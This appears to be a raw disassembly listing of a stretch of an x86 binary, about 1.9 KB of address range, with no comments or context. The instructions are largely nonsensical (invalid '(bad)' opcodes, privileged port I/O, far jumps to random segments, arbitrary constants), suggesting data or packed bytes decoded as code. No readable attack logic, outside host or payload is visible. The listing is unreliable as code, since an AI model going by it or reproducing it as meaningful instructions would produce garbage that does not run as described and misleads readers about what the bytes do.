  40ea10:	lock jo 0x40ea38
  40ea13:	enter  0xdc54,0x1f
  40ea17:	addr16 popa 
  40ea19:	jge    0x40ea11
  40ea1b:	fsubp  st(3),st
  40ea1d:	pop    edi
  40ea1e:	jb     0x40e9f1
  40ea20:	(bad)  
  40ea21:	xchg   ecx,eax
  40ea22:	or     DWORD PTR [edx+0x66],ebp
  40ea25:	or     bl,bl
  40ea27:	dec    ecx
  40ea28:	xchg   ecx,eax
  40ea29:	je     0x40eaa0
  40ea2b:	enter  0xd19f,0xa6
  40ea2f:	lods   eax,DWORD PTR ds:[esi]
  40ea30:	ins    BYTE PTR es:[edi],dx
  40ea31:	mov    ah,0xe8
  40ea33:	adc    ebx,DWORD PTR [ecx-0x40]
  40ea36:	mov    ebp,0x3122261d
  40ea3b:	add    edi,eax
  40ea3d:	mov    ebx,0xebf04fd9
  40ea42:	outs   dx,BYTE PTR ds:[esi]
  40ea43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea44:	inc    esp
  40ea45:	or     esp,edx
  40ea47:	hlt    
  40ea48:	arpl   WORD PTR [edi+0x3a30ae8],cx
  40ea4e:	mov    ecx,0x9cc20e81
  40ea53:	xor    al,0xf8
  40ea55:	std    
  40ea56:	cwde   
  40ea57:	adc    ah,ah
  40ea59:	or     bl,BYTE PTR [ecx+0x66]
  40ea5c:	cs pop edi
  40ea5e:	retf   0xc8c1
  40ea61:	push   ebp
  40ea62:	sbb    DWORD PTR [edi+0x1e277cb1],ecx
  40ea68:	jl     0x40eab5
  40ea6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea6b:	dec    ebp
  40ea6c:	cmp    esp,DWORD PTR [ecx+0x2c]
  40ea6f:	cld    
  40ea70:	or     DWORD PTR [ebp+0x372b9630],ebx
  40ea76:	out    0x16,eax
  40ea78:	push   edx
  40ea79:	gs out dx,eax
  40ea7b:	push   0x4a64c4ef
  40ea80:	lock mov esi,0xf61f0d8d
  40ea86:	add    al,0xd6
  40ea88:	sub    eax,0xbf8abaef
  40ea8d:	dec    esp
  40ea8e:	add    eax,0x9264bff4
  40ea93:	mov    ah,0x8a
  40ea95:	xchg   esi,eax
  40ea96:	shr    bh,cl
  40ea98:	xor    DWORD PTR [ecx+0x67],ebx
  40ea9b:	adc    DWORD PTR [ebx],0x45f5817e
  40eaa1:	cwde   
  40eaa2:	inc    ebx
  40eaa3:	shr    edx,cl
  40eaa5:	push   0xffffff8a
  40eaa7:	in     eax,dx
  40eaa8:	jl     0x40ead0
  40eaaa:	test   esp,0x23edd15e
  40eab0:	cli    
  40eab1:	or     al,0x9d
  40eab3:	scas   al,BYTE PTR es:[edi]
  40eab4:	sub    bl,BYTE PTR [edx]
  40eab6:	push   edi
  40eab7:	dec    ecx
  40eab8:	mov    DWORD PTR [ebx+0x70],ecx
  40eabb:	(bad)  
  40eabc:	clc    
  40eabd:	mov    ds:0x85c713c1,eax
  40eac2:	int3   
  40eac3:	retf   0xddad
  40eac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eac7:	cmp    BYTE PTR [ecx],0x83
  40eaca:	les    ecx,FWORD PTR [eax+0x4f82c8d7]
  40ead0:	cmp    esi,ebx
  40ead2:	jecxz  0x40ea92
  40ead4:	mov    cl,0x89
  40ead6:	push   ds
  40ead7:	lea    di,ds:0x4bde5586
  40eade:	imul   cl
  40eae0:	cs xchg ecx,eax
  40eae2:	push   eax
  40eae3:	jl     0x40eb3b
  40eae5:	cmp    ebp,ecx
  40eae7:	inc    edi
  40eae8:	mov    esp,0xa8e08512
  40eaed:	or     esp,DWORD PTR [esi-0x40]
  40eaf0:	pop    edi
  40eaf1:	sbb    ecx,DWORD PTR ss:[edx]
  40eaf4:	push   0xffffffb4
  40eaf6:	icebp  
  40eaf7:	(bad)  
  40eaf8:	mov    WORD PTR [edx+edx*2+0x4c],gs
  40eafc:	outs   dx,DWORD PTR ds:[esi]
  40eafd:	xchg   edi,eax
  40eafe:	fistp  WORD PTR [ebp-0x44088e51]
  40eb04:	sub    al,0xc1
  40eb06:	test   eax,0xaf99f514
  40eb0b:	xor    DWORD PTR [ebx],esi
  40eb0d:	stos   BYTE PTR es:[edi],al
  40eb0e:	adc    BYTE PTR [esi-0x686bd8d0],ah
  40eb14:	leave  
  40eb15:	fstp   QWORD PTR [edx]
  40eb17:	into   
  40eb18:	in     al,dx
  40eb19:	mov    bh,0x88
  40eb1b:	sbb    DWORD PTR [edi+0x11],edx
  40eb1e:	retf   
  40eb1f:	mov    eax,ds:0x9d201b25
  40eb24:	stos   BYTE PTR es:[edi],al
  40eb25:	popfw  
  40eb27:	ret    0xb30c
  40eb2a:	scas   eax,DWORD PTR es:[edi]
  40eb2b:	inc    esp
  40eb2c:	mov    ebx,0x1e70d47
  40eb31:	arpl   cx,dx
  40eb33:	cmp    al,0x44
  40eb35:	and    DWORD PTR [esi],esp
  40eb37:	sub    edi,ebx
  40eb39:	xchg   edi,eax
  40eb3a:	inc    ecx
  40eb3b:	bound  edi,QWORD PTR ds:0x171a0a16
  40eb41:	stos   DWORD PTR es:[edi],eax
  40eb42:	scas   eax,DWORD PTR es:[edi]
  40eb43:	pop    ebp
  40eb44:	pop    eax
  40eb45:	cmp    esi,DWORD PTR [eax-0x29]
  40eb48:	jecxz  0x40eb73
  40eb4a:	test   eax,0xc655abdc
  40eb4f:	leave  
  40eb50:	inc    edi
  40eb51:	icebp  
  40eb52:	mov    ebx,0x413d83bd
  40eb57:	dec    edi
  40eb58:	pop    ds
  40eb59:	fcmovne st,st(5)
  40eb5b:	retf   
  40eb5c:	push   ds
  40eb5d:	aas    
  40eb5e:	in     al,0x36
  40eb60:	shl    edi,1
  40eb62:	mov    cl,0x59
  40eb64:	ins    BYTE PTR es:[edi],dx
  40eb65:	das    
  40eb66:	mov    esi,0xc4c9c4f1
  40eb6b:	sub    eax,0x61a755e0
  40eb70:	fcom   DWORD PTR [edx+0x19292930]
  40eb76:	mov    ebx,edx
  40eb78:	pusha  
  40eb79:	xor    BYTE PTR [ebp+0x212a520b],ah
  40eb7f:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40eb81:	or     al,BYTE PTR [ebp-0xb]
  40eb84:	sar    DWORD PTR gs:[bp+si],cl
  40eb88:	jle    0x40eb8b
  40eb8a:	ficom  WORD PTR [esp+eax*2-0x69d3f0ea]
  40eb91:	in     al,0x65
  40eb93:	mov    WORD PTR [ebx+0x23419f2a],?
  40eb99:	sar    BYTE PTR [esi],1
  40eb9b:	(bad)  [ebx+0x6d5a1b4d]
  40eba1:	mov    edx,0xb1d2e390
  40eba6:	and    bh,BYTE PTR [ecx]
  40eba8:	ficomp DWORD PTR [esi]
  40ebaa:	sti    
  40ebab:	pop    esp
  40ebac:	in     al,0xbd
  40ebae:	sub    al,0x82
  40ebb0:	in     eax,0xfb
  40ebb2:	dec    ebp
  40ebb3:	ret    0xa171
  40ebb6:	mov    eax,ds:0x1dbf9d5c
  40ebbb:	adc    ebx,DWORD PTR [ecx-0x6d]
  40ebbe:	leave  
  40ebbf:	ret    
  40ebc0:	xchg   ebp,eax
  40ebc1:	stos   BYTE PTR es:[edi],al
  40ebc2:	mov    cl,BYTE PTR [esi]
  40ebc4:	push   eax
  40ebc5:	xchg   DWORD PTR [ebp-0x6c67da01],esp
  40ebcb:	(bad)  
  40ebcc:	imul   edi,DWORD PTR [ecx-0x77],0xc3bdcc3
  40ebd3:	aad    0x98
  40ebd5:	or     dh,BYTE PTR [ebx]
  40ebd7:	xlat   BYTE PTR ds:[ebx]
  40ebd8:	in     al,dx
  40ebd9:	sbb    ch,BYTE PTR [ecx-0x7a]
  40ebdc:	sbb    DWORD PTR [edx-0x6889102c],edx
  40ebe2:	mov    eax,0x171e7f8c
  40ebe7:	jne    0x40ec52
  40ebe9:	out    0x6,al
  40ebeb:	jbe    0x40ec10
  40ebed:	cmp    eax,0x7576c01b
  40ebf2:	fistp  QWORD PTR [edi-0x10458b3a]
  40ebf8:	and    dl,dh
  40ebfa:	aas    
  40ebfb:	pop    ss
  40ebfc:	jmp    0xa9e7:0xbd77fec1
  40ec03:	adc    eax,0x9f844d7e
  40ec08:	out    dx,al
  40ec09:	sub    al,BYTE PTR [ecx+0x22]
  40ec0c:	imul   si,bx,0xf428
  40ec11:	adc    BYTE PTR [edx+eiz*1+0x25],0x47
  40ec16:	and    bl,BYTE PTR [edx]
  40ec18:	ret    0xffb2
  40ec1b:	into   
  40ec1c:	sti    
  40ec1d:	test   ebp,ebx
  40ec1f:	out    dx,eax
  40ec20:	dec    si
  40ec22:	leave  
  40ec23:	add    edx,esp
  40ec25:	or     ecx,DWORD PTR [edx+0x15638850]
  40ec2b:	int    0x3d
  40ec2d:	sub    eax,0x2b41e5dc
  40ec32:	fbstp  TBYTE PTR [edi-0x7035a4f4]
  40ec38:	fbstp  TBYTE PTR [ebx]
  40ec3a:	fst    DWORD PTR [ecx+0x1a]
  40ec3d:	in     eax,0xf4
  40ec3f:	cmp    DWORD PTR ds:0xde2086d8,ecx
  40ec45:	sbb    edi,ebp
  40ec47:	aam    0x7d
  40ec49:	(bad)  
  40ec4b:	inc    ebx
  40ec4c:	scas   al,BYTE PTR es:[edi]
  40ec4d:	pop    edi
  40ec4e:	aaa    
  40ec4f:	ds jecxz 0x40ebf0
  40ec52:	fldcw  WORD PTR [edi]
  40ec54:	test   BYTE PTR [ebp+0x29b96592],bh
  40ec5a:	jge    0x40ebfe
  40ec5c:	in     al,0xc2
  40ec5e:	aam    0xe0
  40ec60:	pop    edi
  40ec61:	pop    ebp
  40ec62:	and    edx,0xa4775913
  40ec68:	jbe    0x40ec1c
  40ec6a:	jl     0x40ec9c
  40ec6c:	sbb    ch,0xec
  40ec6f:	ret    0xfb3e
  40ec72:	pop    esp
  40ec73:	fsub   DWORD PTR [edi]
  40ec75:	and    al,0xa7
  40ec77:	jne    0x40ec61
  40ec79:	sar    DWORD PTR [ebp+0x29],1
  40ec7c:	pop    edx
  40ec7d:	cmp    al,0x8c
  40ec7f:	mov    ebx,edx
  40ec81:	scas   al,BYTE PTR es:[edi]
  40ec82:	mov    dl,0xa4
  40ec84:	jp     0x40ec55
  40ec86:	xor    eax,0x5d28b235
  40ec8b:	cmp    ebx,eax
  40ec8d:	jmp    0x40ec15
  40ec8f:	sbb    DWORD PTR [edx],edx
  40ec91:	imul   esp,DWORD PTR [ebp+0x11fd5e40],0xffffffde
  40ec98:	bnd ret 0xe348
  40ec9c:	loopne 0x40ecda
  40ec9e:	retf   0xbf27
  40eca1:	stos   DWORD PTR es:[edi],eax
  40eca2:	ds pop esp
  40eca4:	pop    ds
  40eca5:	pop    edx
  40eca6:	pop    ss
  40eca7:	add    DWORD PTR [eax+0x4cf5cc2e],ebx
  40ecad:	mov    ch,0x8b
  40ecaf:	adc    eax,0xf66bfc3a
  40ecb4:	mov    ebx,0x3a55d9fd
  40ecb9:	mov    DWORD PTR [esi-0x58],ebp
  40ecbc:	dec    ebx
  40ecbd:	pop    ds
  40ecbe:	addr16 int3 
  40ecc0:	cs (bad) 
  40ecc2:	pop    ecx
  40ecc3:	and    BYTE PTR [esi-0x2cc5bfcf],0x63
  40ecca:	and    BYTE PTR [edx-0x6fc393bf],al
  40ecd0:	pop    es
  40ecd1:	add    BYTE PTR [edi+0x1d],0xa5
  40ecd5:	data16 cmp al,0x5a
  40ecd8:	mov    ecx,0x425669d3
  40ecdd:	add    DWORD PTR [esi-0x335efda3],0x7fa94bde
  40ece7:	dec    edx
  40ece8:	or     edi,ecx
  40ecea:	mov    eax,0x8e19329d
  40ecef:	mov    esi,0x67834bc3
  40ecf4:	xchg   edi,eax
  40ecf5:	call   0xb6593ce6
  40ecfa:	xchg   ch,dh
  40ecfc:	jmp    FWORD PTR [ebx]
  40ecfe:	xchg   esi,eax
  40ecff:	ds das 
  40ed01:	jb     0x40ec96
  40ed03:	sti    
  40ed04:	dec    ebp
  40ed05:	mov    dh,0xa5
  40ed07:	cpuid  
  40ed09:	dec    edi
  40ed0a:	push   edi
  40ed0b:	loopne 0x40ece7
  40ed0d:	pop    ecx
  40ed0e:	adc    bh,BYTE PTR [edx]
  40ed10:	push   ebp
  40ed11:	pop    ss
  40ed12:	or     BYTE PTR ds:0xe5120463,0xef
  40ed19:	pop    ecx
  40ed1a:	jp     0x40ed39
  40ed1c:	test   al,0x22
  40ed1e:	cdq    
  40ed1f:	sbb    BYTE PTR [ebx+0x7a],dl
  40ed22:	add    ebp,edx
  40ed24:	shl    DWORD PTR [eax-0x63],cl
  40ed27:	mov    DWORD PTR [eax+edx*2],esi
  40ed2a:	test   eax,0x7e80d0ce
  40ed2f:	mov    ecx,0x457a86d1
  40ed34:	mov    al,0x33
  40ed36:	rol    BYTE PTR [eax+0x5b],cl
  40ed39:	sub    BYTE PTR [edi+esi*1],0x76
  40ed3d:	jbe    0x40ecc1
  40ed3f:	adc    al,0x6f
  40ed41:	or     ecx,ebx
  40ed43:	jo     0x40ed35
  40ed45:	mov    ch,0xf5
  40ed47:	xor    al,dh
  40ed49:	into   
  40ed4a:	sub    ah,BYTE PTR [ecx]
  40ed4c:	shl    DWORD PTR [esi+ecx*8],1
  40ed4f:	imul   esi,DWORD PTR [ecx+0x5ebe30f4],0x60
  40ed56:	xor    ch,BYTE PTR [eax]
  40ed58:	popa   
  40ed59:	pop    ecx
  40ed5a:	or     DWORD PTR [edi-0x2fd014aa],0xfffffffa
  40ed61:	cli    
  40ed62:	mov    edx,0x9e51ebc
  40ed67:	dec    ecx
  40ed68:	mov    ebx,0xe658d36c
  40ed6d:	push   eax
  40ed6e:	add    cl,bh
  40ed70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed71:	lds    eax,FWORD PTR [ebx+0x67771b80]
  40ed77:	fdiv   st,st(6)
  40ed79:	mov    edx,0xe5919cbd
  40ed7e:	aam    0x24
  40ed80:	ffreep st(3)
  40ed82:	dec    ebp
  40ed83:	lods   eax,DWORD PTR ds:[esi]
  40ed84:	sbb    BYTE PTR ds:0x129ddac1,0xc9
  40ed8b:	das    
  40ed8c:	mov    cl,0x7e
  40ed8e:	push   0xffffff93
  40ed90:	loope  0x40edb5
  40ed92:	out    dx,eax
  40ed93:	xor    eax,0xc31dbb04
  40ed98:	in     al,dx
  40ed99:	or     edx,DWORD PTR [edx+0x4d]
  40ed9c:	sub    ch,BYTE PTR [ebx+0x5caa69a3]
  40eda2:	fstp   QWORD PTR [ebx+0x68]
  40eda5:	jecxz  0x40ed94
  40eda7:	sbb    eax,0x1132d3c1
  40edac:	add    al,0x97
  40edae:	lahf   
  40edaf:	scas   al,BYTE PTR es:[edi]
  40edb0:	ja     0x40edf8
  40edb2:	add    eax,0x26c9bec5
  40edb7:	jmp    0xd644:0xb9360c6a
  40edbe:	clc    
  40edbf:	add    esi,DWORD PTR [ecx-0xd7ac899]
  40edc5:	mov    al,ds:0x9124072d
  40edca:	adc    bh,dh
  40edcc:	mov    BYTE PTR [ebx-0x7b],bh
  40edcf:	xor    al,0x1
  40edd1:	jge    0x40edf8
  40edd3:	xchg   ecx,eax
  40edd4:	aad    0xaf
  40edd6:	mov    eax,esi
  40edd8:	mov    dh,0x2c
  40edda:	pusha  
  40eddb:	inc    edi
  40eddc:	stc    
  40eddd:	push   es
  40edde:	dec    ebx
  40eddf:	sub    al,0xfe
  40ede1:	outs   dx,BYTE PTR ds:[esi]
  40ede2:	xor    al,0x95
  40ede4:	pop    ebp
  40ede5:	mov    edx,0xd7ebd348
  40edea:	pop    ss
  40edeb:	xchg   esp,eax
  40edec:	aaa    
  40eded:	stc    
  40edee:	inc    edi
  40edef:	inc    edi
  40edf0:	add    edi,DWORD PTR [esi+ecx*2+0x3db2f96c]
  40edf7:	sub    edx,DWORD PTR [edx]
  40edf9:	fistp  DWORD PTR [edx]
  40edfb:	pop    ds
  40edfc:	bound  ebx,QWORD PTR [ecx]
  40edfe:	sub    DWORD PTR [eax],0xfb164ff3
  40ee04:	shr    BYTE PTR [ebp+0x67],cl
  40ee07:	popa   
  40ee08:	mov    cl,0xf5
  40ee0a:	repz xchg esi,eax
  40ee0c:	or     bh,ch
  40ee0e:	icebp  
  40ee0f:	push   0x4c
  40ee11:	xor    al,0x17
  40ee13:	ja     0x40ee7a
  40ee15:	and    ah,BYTE PTR [esp+esi*1]
  40ee18:	adc    ebx,DWORD PTR [edx+0x6a53bb68]
  40ee1e:	out    0xec,al
  40ee20:	xor    ebp,DWORD PTR [ebx-0xacc5e24]
  40ee26:	xlat   BYTE PTR ds:[ebx]
  40ee27:	mov    al,ds:0xf4bd64fa
  40ee2c:	test   eax,0xadad12e9
  40ee31:	cmc    
  40ee32:	(bad)  
  40ee33:	sbb    bl,BYTE PTR [ebx+0x6fa0074d]
  40ee39:	and    ch,0x6f
  40ee3c:	dec    ecx
  40ee3d:	inc    ebp
  40ee3e:	ds push cs
  40ee40:	mov    ds:0xcc6cdcc4,eax
  40ee45:	cld    
  40ee46:	lds    edi,FWORD PTR [esi-0x2b83bbc]
  40ee4c:	push   ds
  40ee4d:	push   ebx
  40ee4e:	and    al,0x99
  40ee50:	ss dec esp
  40ee52:	jo     0x40ee97
  40ee54:	jnp    0x40edea
  40ee56:	mov    bh,0xb4
  40ee58:	push   ebp
  40ee59:	mov    ebx,0xfc579783
  40ee5e:	add    edx,0xffffffa0
  40ee61:	pop    eax
  40ee62:	sub    BYTE PTR ds:0x8acdff8b,0x80
  40ee69:	push   ecx
  40ee6a:	out    0x51,al
  40ee6c:	push   esp
  40ee6d:	js     0x40ee0c
  40ee6f:	adc    dh,BYTE PTR [ebx-0x7e1ddcc9]
  40ee75:	sub    ebx,DWORD PTR [esp+eiz*8]
  40ee78:	popf   
  40ee79:	mov    al,ds:0xbb720a0e
  40ee7e:	cmp    DWORD PTR [ebp-0x358a52a6],ebp
  40ee84:	jecxz  0x40eec5
  40ee86:	mov    dh,0x26
  40ee88:	das    
  40ee89:	cli    
  40ee8a:	jg     0x40eec2
  40ee8c:	xor    eax,0x1548c936
  40ee91:	scas   al,BYTE PTR es:[edi]
  40ee92:	test   DWORD PTR [esi+edi*4],eax
  40ee95:	jne    0x40ee51
  40ee97:	jmp    0xc07e:0x6a4e0c35
  40ee9e:	int    0x99
  40eea0:	popa   
  40eea1:	in     eax,0x8a
  40eea3:	cld    
  40eea4:	and    edi,ecx
  40eea6:	xlat   BYTE PTR ds:[ebx]
  40eea7:	xlat   BYTE PTR ds:[ebx]
  40eea8:	mov    DWORD PTR [edi],ebp
  40eeaa:	inc    esp
  40eeab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeac:	outs   dx,BYTE PTR ds:[esi]
  40eead:	test   DWORD PTR [edx+0x398f3a72],0xdfa7de4c
  40eeb7:	dec    esp
  40eeb8:	pop    eax
  40eeb9:	call   DWORD PTR [edi+edi*1+0x41]
  40eebd:	sub    DWORD PTR [esi],ebx
  40eebf:	mov    esp,esi
  40eec1:	lea    esi,[ebx+eiz*1-0x682d1fb1]
  40eec8:	add    eax,0xba51609
  40eecd:	mov    esp,0x436b6cac
  40eed2:	xchg   ecx,eax
  40eed3:	rcr    DWORD PTR [ebx],1
  40eed5:	in     eax,dx
  40eed6:	iret   
  40eed7:	jmp    0x75a47d8b
  40eedc:	xchg   edi,eax
  40eedd:	jecxz  0x40ef04
  40eedf:	sbb    ah,BYTE PTR [edi-0x51f3fc6]
  40eee5:	cld    
  40eee6:	inc    edi
  40eee7:	je     0x40ef5e
  40eee9:	xor    bl,bh
  40eeeb:	idiv   DWORD PTR [edx]
  40eeed:	xchg   esp,eax
  40eeee:	sti    
  40eeef:	push   ecx
  40eef0:	out    0xfa,eax
  40eef2:	sbb    al,0x5a
  40eef4:	sar    BYTE PTR [ebp+0x14],1
  40eef7:	(bad)
  40eefa:	mov    ebp,0x76b88bd2
  40eeff:	mov    ds:0x15756388,al
  40ef04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef05:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef07:	idiv   DWORD PTR [esi-0x3064cc46]
  40ef0d:	pop    esp
  40ef0e:	push   eax
  40ef0f:	nop
  40ef10:	sbb    eax,0x41dff071
  40ef15:	mov    esp,0x9fa49032
  40ef1a:	jnp    0x40eecd
  40ef1c:	pop    esp
  40ef1d:	dec    ecx
  40ef1e:	test   al,0x4c
  40ef20:	mov    cl,0x28
  40ef22:	and    ecx,DWORD PTR [ecx-0x6f]
  40ef25:	icebp  
  40ef26:	xchg   esp,eax
  40ef27:	sub    dl,BYTE PTR [eax-0x3d93be1c]
  40ef2d:	jo     0x40ef62
  40ef2f:	dec    edx
  40ef30:	xchg   DWORD PTR [ecx+0x31acf747],edi
  40ef36:	ret    
  40ef37:	and    BYTE PTR [eax-0x6f],bh
  40ef3a:	(bad)  
  40ef3b:	iret   
  40ef3c:	mov    ah,0xd8
  40ef3e:	cs jo  0x40ef58
  40ef41:	fist   DWORD PTR [edi]
  40ef43:	repnz xchg ebp,eax
  40ef45:	sbb    al,0xdd
  40ef47:	dec    edi
  40ef48:	xchg   esp,eax
  40ef49:	scas   eax,DWORD PTR es:[edi]
  40ef4a:	jle    0x40efc2
  40ef4c:	cmp    eax,0xf90145f0
  40ef51:	fdiv   QWORD PTR [eax-0x73]
  40ef54:	xchg   ebp,eax
  40ef55:	(bad)  
  40ef56:	call   0x9e22:0x6ec554be
  40ef5d:	inc    eax
  40ef5e:	daa    
  40ef5f:	fcomi  st,st(0)
  40ef61:	pop    ds
  40ef62:	outs   dx,BYTE PTR ds:[esi]
  40ef63:	shl    BYTE PTR [edi+0x4],0x2b
  40ef67:	in     al,0x1d
  40ef69:	cmp    ch,BYTE PTR [edx-0x6d]
  40ef6c:	jno    0x40ef67
  40ef6e:	into   
  40ef6f:	(bad)  
  40ef70:	popa   
  40ef71:	sub    eax,0x89b31bec
  40ef76:	loopne 0x40efd7
  40ef78:	ret    
  40ef79:	call   0x6bb0a764
  40ef7e:	cmc    
  40ef7f:	mov    ch,BYTE PTR [ebx+0x1f61394f]
  40ef85:	mov    edi,0x124f8695
  40ef8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef8c:	adc    dl,bl
  40ef8e:	clc    
  40ef8f:	aas    
  40ef90:	cmp    BYTE PTR [edi-0x5653915b],ch
  40ef96:	rcr    BYTE PTR [esi+0x36],1
  40ef99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef9a:	mov    al,ds:0x69c296f4
  40ef9f:	(bad)  
  40efa0:	ins    DWORD PTR es:[edi],dx
  40efa1:	retf   
  40efa2:	inc    edi
  40efa3:	jmp    0x40efc6
  40efa5:	xor    DWORD PTR [eax+0x75],ebp
  40efa8:	xchg   esp,eax
  40efa9:	out    0x7b,eax
  40efab:	je     0x40efda
  40efad:	(bad)  
  40efae:	retf   0x2b89
  40efb1:	mov    edi,edi
  40efb3:	sbb    ebx,ebp
  40efb5:	push   ds
  40efb6:	pop    edx
  40efb7:	sub    DWORD PTR [esi+0x5e790d36],ebp
  40efbd:	and    BYTE PTR [eax],ah
  40efbf:	loop   0x40ef8a
  40efc1:	push   edx
  40efc2:	sub    esi,DWORD PTR [ebp-0x33d6b90c]
  40efc8:	and    BYTE PTR [edx],0x5a
  40efcb:	xor    eax,0x960f6ea3
  40efd0:	xor    esi,eax
  40efd2:	out    dx,al
  40efd3:	mov    dh,0x8f
  40efd5:	sar    DWORD PTR ds:0xf1f94ea1,0x2f
  40efdc:	jp     0x40f031
  40efde:	mov    ch,0x75
  40efe0:	lds    edx,FWORD PTR [edi-0x2e]
  40efe3:	les    ecx,FWORD PTR [edi+edi*4-0x1b983598]
  40efea:	add    esp,ecx
  40efec:	int    0xb
  40efee:	test   al,0x65
  40eff0:	dec    ecx
  40eff1:	sbb    BYTE PTR [edi-0x1ee7e196],0xf0
  40eff8:	mov    ds:0xef815cae,al
  40effd:	jae    0x40f07d
  40efff:	xchg   esi,eax
  40f000:	inc    ebx
  40f001:	gs test al,0x39
  40f004:	inc    ecx
  40f005:	jmp    DWORD PTR [edx+0x575b4aae]
  40f00b:	cwde   
  40f00c:	mov    ah,BYTE PTR [ebx]
  40f00e:	jno    0x40effb
  40f010:	or     dl,al
  40f012:	xchg   esi,eax
  40f013:	dec    ebp
  40f014:	pop    es
  40f015:	jae    0x40f030
  40f017:	and    eax,0x34b5ff52
  40f01c:	loope  0x40f00f
  40f01e:	cmp    esp,DWORD PTR [ebp-0x4d]
  40f021:	jns    0x40efae
  40f023:	cmc    
  40f024:	jl     0x40f007
  40f026:	pop    esp
  40f027:	arpl   WORD PTR [edi+0x1bd5ff05],ax
  40f02d:	jmp    0x2654c319
  40f032:	mov    cl,0xb2
  40f034:	push   0xeaebd3fc
  40f039:	inc    edx
  40f03a:	add    edx,DWORD PTR [esp+edi*4-0x458e5b83]
  40f041:	enter  0x444c,0x0
  40f045:	cdq    
  40f046:	pop    esi
  40f047:	je     0x40f070
  40f049:	mov    esp,0xa84fc8f4
  40f04e:	xchg   ebx,eax
  40f04f:	pop    ebp
  40f050:	add    BYTE PTR [ebp-0x764a5fc0],0xb
  40f057:	mov    esp,DWORD PTR [eax+ebx*2+0x3a]
  40f05b:	cmc    
  40f05c:	sbb    DWORD PTR [edi-0x3f5c0898],0xffffff89
  40f063:	jmp    0x40f0a3
  40f065:	cmp    esi,0xd5d177f6
  40f06b:	mov    fs,esp
  40f06d:	mov    ebp,0xdc238dcb
  40f072:	mov    ah,BYTE PTR [ebp-0x438aaf88]
  40f078:	jns    0x40f076
  40f07a:	fstp   DWORD PTR [edi-0x159e3fd4]
  40f080:	sbb    bl,BYTE PTR ds:0x32f42697
  40f086:	popa   
  40f087:	daa    
  40f088:	mov    ebx,0xe9fd951
  40f08d:	xchg   esi,eax
  40f08e:	mov    bl,0x79
  40f090:	sub    eax,0xa68f560e
  40f095:	xor    eax,eax
  40f097:	cmc    
  40f098:	mov    ch,0xdf
  40f09a:	mov    cl,0x6e
  40f09c:	jge    0x40f042
  40f09e:	je     0x40f02f
  40f0a0:	sbb    DWORD PTR [edi+0x4a],eax
  40f0a3:	data16 or BYTE PTR [ebp+0x37],dh
  40f0a7:	call   0xf20f:0x97b054df
  40f0ae:	fadd   st(7),st
  40f0b0:	imul   esp,DWORD PTR [ebp-0x12],0x835b3d68
  40f0b7:	imul   esi,DWORD PTR [ecx+0x18],0x84fca811
  40f0be:	xchg   ebx,eax
  40f0bf:	sbb    ecx,eax
  40f0c1:	jg     0x40f070
  40f0c3:	and    al,0x24
  40f0c5:	mov    eax,0xd2c956f
  40f0ca:	or     DWORD PTR [esi],esi
  40f0cc:	and    bl,BYTE PTR [edx-0x53313c3]
  40f0d2:	vmwrite edi,DWORD PTR ds:0xf9ae34eb
  40f0d9:	pop    ds
  40f0da:	shl    DWORD PTR [ecx],0x14
  40f0dd:	xor    BYTE PTR [edx+0x6c0bf10a],dl
  40f0e3:	add    BYTE PTR [ecx+0x703a8beb],bl
  40f0e9:	fwait
  40f0ea:	push   0x1a
  40f0ec:	loop   0x40f0e2
  40f0ee:	enter  0x7d66,0xda
  40f0f2:	(bad)  
  40f0f3:	scas   al,BYTE PTR es:[edi]
  40f0f4:	sahf   
  40f0f5:	jae    0x40f07a
  40f0f7:	push   esi
  40f0f8:	loop   0x40f13e
  40f0fa:	sub    eax,0xc8aff8cd
  40f0ff:	das    
  40f100:	(bad)  
  40f101:	jmp    0x7d26beaf
  40f106:	sbb    al,bl
  40f108:	add    DWORD PTR [edi-0x31afaec6],eax
  40f10e:	mov    DWORD PTR [edi+0x1233964b],ebp
  40f114:	sbb    dl,dl
  40f116:	in     eax,dx
  40f117:	and    al,BYTE PTR [esi+ebp*1]
  40f11a:	fcom   QWORD PTR [ecx-0x79e6ebf1]
  40f120:	and    eax,0xe8239edd
  40f125:	cmp    DWORD PTR [esi+0x3941f839],eax
  40f12b:	push   cs
  40f12c:	push   esp
  40f12d:	into   
  40f12e:	idiv   bl
  40f130:	mov    ebx,0xe658f7
  40f135:	sub    DWORD PTR [edx-0x7c],esp
  40f138:	(bad)  
  40f139:	pop    eax
  40f13a:	and    BYTE PTR [ebp*8-0x72ae5113],al
  40f141:	in     eax,0xce
  40f143:	sub    esp,DWORD PTR [eax+eiz*8]
  40f146:	scas   eax,DWORD PTR es:[edi]
  40f147:	out    dx,al
  40f148:	mov    ecx,gs
  40f14a:	inc    edi
  40f14b:	add    al,BYTE PTR [eax+0x1588d5f7]
  40f151:	mov    ds:0x1e15ce0e,eax
  40f156:	repnz imul BYTE PTR [edx+ecx*2-0xc2e2cc8]
  40f15e:	fsub   QWORD PTR [edx]
  40f160:	dec    esi
  40f161:	pop    edx
  40f162:	mov    eax,ds:0xdf773911
  40f167:	add    al,0xea
  40f169:	aaa    
  40f16a:	dec    ebx
  40f16b:	and    DWORD PTR [edi],ebp
  40f16d:	mov    ebx,0x76b87aad
  40f172:	stc    
  40f173:	xchg   ebp,eax
  40f174:	pop    esp
  40f175:	mov    ah,BYTE PTR [edi-0x57]
  40f178:	mov    edx,0x846c704e
  40f17d:	ret    0x52f3
  40f180:	mov    cl,0x5b
  40f182:	pusha  
  40f183:	adc    DWORD PTR [edi+0x51e8d297],edi
  40f189:	int3   
  40f18a:	adc    cl,BYTE PTR [esi+0x53]
  40f18d:	je     0x40f1f4
  40f18f:	cdq    
  40f190:	inc    edi
  40f191:	js     0x40f1b7
  40f193:	jbe    0x40f1f2
  40f195:	sub    ebx,0xb8250b1
  40f19b:	xor    edx,DWORD PTR [ebx+0x42]
  40f19e:	sub    esp,DWORD PTR [eax+0x6861819d]
  40f1a4:	pop    edx
